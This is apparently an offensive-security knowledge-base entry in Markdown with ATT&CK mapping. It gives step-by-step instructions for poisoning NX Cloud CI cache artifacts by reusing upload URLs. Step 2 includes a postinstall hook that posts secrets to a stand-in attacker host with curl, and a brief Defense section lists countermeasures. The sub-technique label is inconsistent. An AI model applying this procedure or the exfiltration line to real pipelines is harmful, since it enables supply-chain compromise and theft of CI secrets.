---
id: proc-2255750-2
tags:
  - cache-poisoning
  - supply-chain
  - nx-cloud
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Cloud
  - CI/CD
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Supply Chain Compromise]]'
  - '[[Data Manipulation]]'
updated_at: '2025-12-14T17:23:54.347Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques:
  - '[[Compromise Hardware Supply Chain]]'
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Supply Chain Compromise]]'
  - '[[Data Manipulation]]'
---
# Reuse Upload URL to Poison Cache Artifact

## Summary

This procedure exploits the reusability of NX Cloud upload URLs to overwrite legitimate cache artifacts with malicious content, injecting code that executes during CI builds.

## Description

NX Cloud's caching service in the fxa repository allows multiple uploads to the same artifact via the same authorized URL, without validation. An attacker downloads the original cache (if needed), modifies it to include executable payloads (e.g., npm scripts or build hooks), and re-uploads. This poisons the distributed cache, affecting all builds that restore it. The attack requires the URL from prior reconnaissance and targets monorepo build environments; outcomes lead to RCE on cache restoration.

## Requirements

1. Valid upload URL from the target NX Cloud cache artifact.
2. Ability to modify cache files (e.g., tarballs containing build dependencies).
3. Knowledge of the build process to inject compatible malicious code.

## Defense

Defensive measures and detection strategies:

- Implement upload validation, such as HMAC checks or single-use tokens.
- Scan cache artifacts for integrity on restore in CI pipelines.
- Log and alert on multiple uploads to the same cache key.

## Objectives

1. Overwrite the CI cache artifact with injected malicious code.
2. Ensure the poison maintains compatibility for build restoration.
3. Prepare for RCE execution in subsequent pipeline runs.

## Instructions

### Step 1: Download and Analyze Original Cache

**Context**: Retrieve the current cache to understand its structure for effective poisoning.

Use the upload URL (which often supports GET for download) to fetch the artifact. Unpack it (e.g., it's typically a .tgz file) and identify injectable points, such as node_modules or build scripts.

### Step 2: Modify Cache with Malicious Payload

**Context**: Inject code that will execute on cache restore, such as a postinstall script.

Edit files to add arbitrary commands (e.g., in package.json: "postinstall": "curl -d @secrets attacker.com"). Repack the cache artifact.

### Step 3: Re-upload Poisoned Artifact

**Context**: Exploit reusability to replace the original.

Send a PUT or POST request to the URL with the modified artifact. No additional auth is needed due to the URL's token.

**Expected Output**: HTTP 200 or success response from NX Cloud indicating upload completion.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Supply Chain Compromise]] Supply Chain Compromise
- [[Data Manipulation]] Data Manipulation

### Sub-Techniques

- [[Compromise Hardware Supply Chain]] Compromise Software Dependencies and Development Tools

## Commands Used


## Tools Used


## Tags

- cache-poisoning
- supply-chain
- nx-cloud
